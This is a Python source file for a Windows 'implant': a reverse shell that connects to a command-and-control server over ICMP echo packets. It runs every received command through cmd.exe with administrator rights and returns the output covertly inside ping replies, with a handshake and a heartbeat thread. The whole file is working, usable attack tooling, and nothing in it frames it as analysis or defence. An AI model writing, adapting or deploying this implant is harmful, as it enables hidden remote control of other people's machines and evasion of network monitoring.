#!/usr/bin/env python3
"""
ICMP Reverse Shell - Windows Implant
Connects to C2 server via ICMP packets, executes commands
Works on: Windows 10/11 (requires admin)
"""

import socket
import struct
import subprocess
import os
import sys
import time
import threading

class ICMPWindowsImplant:
    def __init__(self, server_ip):
        self.server_ip = server_ip
        self.sock = None
        self.icmp_id = os.getpid() & 0xFFFF
        self.seq = 0
        self.running = True
        
    def create_socket(self):
        """Create raw ICMP socket on Windows"""
        try:
            # Windows requires admin and special socket creation
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self.sock.settimeout(5)
            print("[+] Raw ICMP socket created (Windows)")
            return True
        except PermissionError:
            print("[-] Administrator privileges required!")
            print("    Run as Administrator")
            return False
        except Exception as e:
            print(f"[-] Socket error: {e}")
            return False
    
    def checksum(self, data):
        """Calculate ICMP checksum"""
        total = 0
        count = len(data)
        
        # Sum 16-bit words
        for i in range(0, count, 2):
            if i + 1 < count:
                total += (data[i] << 8) + data[i + 1]
            else:
                total += data[i] << 8
        
        # Fold 32-bit to 16-bit
        while total >> 16:
            total = (total & 0xFFFF) + (total >> 16)
        
        return ~total & 0xFFFF
    
    def create_icmp_request(self, payload):
        """Create ICMP Echo Request packet"""
        icmp_type = 8  # Echo Request
        icmp_code = 0
        icmp_checksum = 0
        
        # Pack header (without checksum)
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, self.icmp_id, self.seq)
        
        # Prepare data
        if isinstance(payload, str):
            data = payload.encode('utf-8')
        else:
            data = payload
        
        packet = header + data
        
        # Calculate checksum
        icmp_checksum = self.checksum(packet)
        
        # Rebuild header with correct checksum
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, self.icmp_id, self.seq)
        
        return header + data
    
    def send_packet(self, payload):
        """Send ICMP packet to C2 server"""
        try:
            packet = self.create_icmp_request(payload)
            self.sock.sendto(packet, (self.server_ip, 0))
            self.seq += 1
            return True
        except Exception as e:
            print(f"[-] Send error: {e}")
            return False
    
    def receive_packet(self):
        """Receive ICMP response from C2 server"""
        try:
            packet, addr = self.sock.recvfrom(4096)
            
            # Parse IP header (20 bytes minimum)
            ip_header_length = (packet[0] & 0x0F) * 4
            icmp_start = ip_header_length
            
            # Parse ICMP header
            icmp_header = packet[icmp_start:icmp_start+8]
            icmp_type, icmp_code, _, icmp_id, icmp_seq = struct.unpack('!BBHHH', icmp_header)
            
            # Check if it's an Echo Reply (type 0) for us
            if icmp_type == 0 and icmp_id == self.icmp_id:
                payload = packet[icmp_start+8:].decode('utf-8', errors='ignore').strip('\x00')
                return payload
            
            return None
            
        except socket.timeout:
            return None
        except Exception as e:
            return None
    
    def execute_command(self, command):
        """Execute system command and return output"""
        try:
            # Use cmd.exe on Windows
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                executable="cmd.exe"
            )
            
            output = result.stdout + result.stderr
            
            if not output or output.strip() == "":
                output = "[Command executed with no output]"
            
            # ICMP packet size limit ~1000 bytes
            if len(output) > 950:
                output = output[:950] + "\n...[TRUNCATED]"
            
            return output
            
        except subprocess.TimeoutExpired:
            return "[!] Command timeout after 30 seconds"
        except Exception as e:
            return f"[!] Error: {str(e)}"
    
    def send_heartbeat(self):
        """Send periodic heartbeat to maintain connection"""
        while self.running:
            time.sleep(10)
            if self.running:
                self.send_packet("HEARTBEAT")
    
    def connect(self):
        """Establish connection to C2 server"""
        print(f"[*] Connecting to C2: {self.server_ip}")
        print(f"[*] Implant ID: {self.icmp_id}")
        
        # Send initial handshake
        for attempt in range(3):
            if self.send_packet("HELLO"):
                print("[+] Handshake sent")
                break
            time.sleep(2)
        else:
            print("[-] Failed to connect")
            return False
        
        # Wait for READY response
        response = self.receive_packet()
        if response == "READY":
            print("[+] Connection established!")
            return True
        else:
            print("[-] Handshake failed")
            return False
    
    def run(self):
        """Main execution loop"""
        if not self.create_socket():
            return
        
        if not self.connect():
            return
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        heartbeat_thread.start()
        
        print("[*] Waiting for commands...")
        print("[*] Press Ctrl+C to exit\n")
        
        while self.running:
            try:
                # Wait for command from server
                command = self.receive_packet()
                
                if command:
                    if command.lower() == "exit":
                        print("[*] Exit command received")
                        self.running = False
                        break
                    
                    # Execute command and send result
                    print(f"[+] Executing: {command[:50]}")
                    output = self.execute_command(command)
                    self.send_packet(output)
                
            except KeyboardInterrupt:
                print("\n[*] Shutting down implant...")
                self.running = False
                break
            except Exception as e:
                print(f"[-] Error in main loop: {e}")
                time.sleep(5)
        
        self.sock.close()
        print("[+] Implant stopped")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python client_windows.py <SERVER_IP>")
        print("Example: python client_windows.py 192.168.1.100")
        print("\nNote: Run as Administrator!")
        sys.exit(1)
    
    server_ip = sys.argv[1]
    
    # Check for admin on Windows
    import ctypes
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("[-] Administrator privileges required!")
        print("    Right-click -> Run as Administrator")
        sys.exit(1)
    
    implant = ICMPWindowsImplant(server_ip)
    implant.run()